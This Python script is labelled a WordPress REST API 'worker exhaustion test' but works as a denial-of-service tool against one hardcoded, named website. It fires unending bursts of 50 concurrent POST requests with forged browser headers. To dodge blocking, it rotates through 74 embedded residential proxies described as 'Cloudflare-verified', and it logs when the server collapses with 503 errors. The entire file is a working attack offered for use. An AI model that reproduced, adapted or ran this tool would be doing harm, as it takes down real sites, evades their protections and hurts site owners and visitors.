#!/usr/bin/env python3
"""
vps_burst.py — WordPress REST API worker exhaustion test.
74 Cloudflare-verified residential proxies embedded.
Run from any machine EXCEPT the target VPS itself.

Install: pip3 install requests
Run:     python3 vps_burst.py
"""

import requests, threading, itertools, time, sys
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

TARGET = "https://metoo-shatkin.com/wp-json/wp/v2/posts"
CONC   = 50
TIMEOUT = 20

HEADERS = {
    "User-Agent":        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Accept":            "application/json, text/plain, */*",
    "Accept-Language":   "en-US,en;q=0.9",
    "Accept-Encoding":   "gzip, deflate, br",
    "Content-Type":      "application/json",
    "sec-ch-ua":         '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
    "sec-ch-ua-mobile":  "?0",
    "sec-ch-ua-platform": '"Windows"',
    "sec-fetch-dest":    "empty",
    "sec-fetch-mode":    "cors",
    "sec-fetch-site":    "same-origin",
    "Referer":           "https://metoo-shatkin.com/",
}

# 74 CF-verified residential proxies (tested 2026-07-21)
PROXIES = [
    "154.6.87.40:6510","142.111.227.60:6255","166.88.64.127:6510","91.198.95.207:8508",
    "104.233.15.120:5843","216.74.114.95:6378","91.198.95.41:8342","31.58.16.134:6101",
    "173.239.237.50:5696","154.6.129.108:5578","23.26.95.159:5641","161.123.154.151:6681",
    "142.147.244.66:6310","82.24.212.236:5542","198.37.98.200:5730","82.22.211.220:6028",
    "198.37.118.246:5705","173.211.69.158:6751","154.29.232.187:6847","172.120.101.201:6380",
    "173.211.30.14:6448","45.115.194.139:5835","154.6.114.229:7198","146.103.5.41:6621",
    "31.58.16.27:5994","198.37.98.253:5783","154.6.116.193:6162","136.0.120.129:6147",
    "31.57.78.108:5492","31.58.16.135:6102","192.177.103.55:6548","45.41.171.134:6170",
    "142.147.244.94:6338","104.239.80.81:5659","67.227.112.240:6280","142.147.132.138:6333",
    "191.101.188.137:6891","166.88.195.35:5667","104.253.208.156:6567","31.59.18.131:6712",
    "154.29.233.8:5769","136.0.108.12:5688","166.88.3.89:6560","199.180.11.22:6759",
    "154.6.8.43:5510","104.232.209.159:6117","172.121.139.37:5216","136.0.108.155:5831",
    "172.120.112.73:5752","154.6.11.191:5660","142.111.124.137:6157","23.27.93.237:5816",
    "23.26.71.187:5670","45.38.69.95:6020","23.27.91.210:6289","31.58.151.197:8193",
    "173.239.237.102:5748","89.32.200.195:6651","67.227.1.179:6460","82.108.65.126:6265",
    "154.30.1.111:5427","192.177.87.113:5959","142.111.58.118:6696","198.89.123.110:6652",
    "154.29.232.146:6806","173.211.69.144:6737","191.101.25.169:6566","67.227.37.219:5761",
    "185.202.175.225:8425","45.81.149.171:8671","172.120.119.208:5868","166.88.64.129:6512",
    "136.0.109.93:6379","161.123.93.236:5966",
]

proxy_cycle = itertools.cycle([f"http://{p}" for p in PROXIES])
lock = threading.Lock()
def next_proxy():
    with lock: return next(proxy_cycle)

def fire():
    p = next_proxy()
    t0 = time.time()
    try:
        r = requests.post(TARGET, headers=HEADERS,
                          data='{"title":"t","content":"t","status":"draft"}',
                          proxies={"http": p, "https": p}, timeout=TIMEOUT)
        return r.status_code, time.time()-t0
    except:
        return 0, time.time()-t0

G="\033[0;32m";R="\033[0;31m";Y="\033[0;33m";C="\033[0;36m";W="\033[0m";B="\033[1m"
print(f"\n{B}{'═'*60}{W}")
print(f"  REST API Burst — {CONC} concurrent | {len(PROXIES)} CF-verified proxies")
print(f"  Target: {TARGET}")
print(f"  Ctrl+C to stop\n{B}{'═'*60}{W}\n")

burst=0; total=0; total_503=0; collapses=[]; t0=time.time()
try:
    while True:
        burst+=1
        ts=datetime.now().strftime("%H:%M:%S")
        with ThreadPoolExecutor(max_workers=CONC) as ex:
            futs=[ex.submit(fire) for _ in range(CONC)]
            codes=[]; times=[]
            for f in as_completed(futs):
                c,t=f.result(); codes.append(c); times.append(t); total+=1
        c401=codes.count(401); c200=codes.count(200); c403=codes.count(403)
        c503=codes.count(503); cerr=codes.count(0)
        avg=sum(times)/len(times)
        total_503+=c503
        if c503>0: collapses.append(ts); st=f"{R}{B}⚠ SERVER DOWN {c503}x503{W}"
        elif avg>8: st=f"{Y}HEAVY DEGRADED{W}"
        elif avg>4: st=f"{Y}DEGRADED{W}"
        else: st=f"{G}RESPONDING{W}"
        print(f"  {C}[{burst:>4}]{W} {ts} 200={c200} 401={c401} 403={c403} 503={c503} ERR={cerr} avg={avg:.2f}s {st}")
except KeyboardInterrupt:
    print(f"\n  Bursts:{burst} Reqs:{total} 503s:{total_503} Runtime:{time.time()-t0:.0f}s")
    if collapses:
        print(f"  {R}Collapse windows: {', '.join(collapses)}{W}")
    print()
